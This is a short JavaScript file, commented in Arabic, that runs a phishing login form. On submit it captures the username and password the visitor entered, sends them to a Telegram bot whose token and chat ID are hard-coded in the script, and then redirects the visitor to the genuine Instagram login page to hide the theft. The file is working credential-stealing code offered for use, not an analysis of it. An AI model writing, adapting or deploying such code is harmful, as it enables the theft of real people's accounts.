document.getElementById('loginButton').addEventListener('click', function (e) {
  e.preventDefault(); // لمنع الإجراء الافتراضي (إعادة تحميل الصفحة)

  // التقاط البيانات من النموذج
  var username = document.getElementById('username').value;
  var password = document.getElementById('password').value;

  // إنشاء الرسالة لإرسالها عبر البوت
  var message = 'New login attempt:\nUsername: ' + username + '\nPassword: ' + password;

  // رابط API البوت الخاص بك مع chat_id الخاص بك
  var botToken = '7645263413:AAFZXNAnQqEILHLxpbn0UqMic9C0-iBpbNI';
  var chatId = '1424595116';
  var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);

  // إرسال البيانات عبر الـ Fetch API
  fetch(url)
    .then(function(response) {
      return response.json();
    })
    .then(function(data) {
      console.log('Message sent successfully:', data);
      
      // إعادة التوجيه بعد نجاح الإرسال
      window.location.href = "https://www.instagram.com/accounts/login/?hl=ar"; // استبدل بالرابط الذي تريد التحويل إليه
    })
    .catch(function(error) {
      console.error('Error sending message:', error);
    });
});
